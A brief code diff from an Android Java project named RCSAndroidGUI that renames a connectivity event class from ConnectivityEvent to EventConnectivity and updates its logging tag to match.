@@ -9,9 +9,9 @@ import com.ht.RCSAndroidGUI.interfaces.Observer;
 import com.ht.RCSAndroidGUI.listener.ListenerConnectivity;
 import com.ht.RCSAndroidGUI.util.DataBuffer;
 
-public class ConnectivityEvent extends EventBase implements Observer<Connectivity> {
+public class EventConnectivity extends EventBase implements Observer<Connectivity> {
 		/** The Constant TAG. */
-		private static final String TAG = "ConnectivityEvent";
+		private static final String TAG = "EventConnectivity";
 
 		private int actionOnExit, actionOnEnter;
 		private boolean inRange = false;
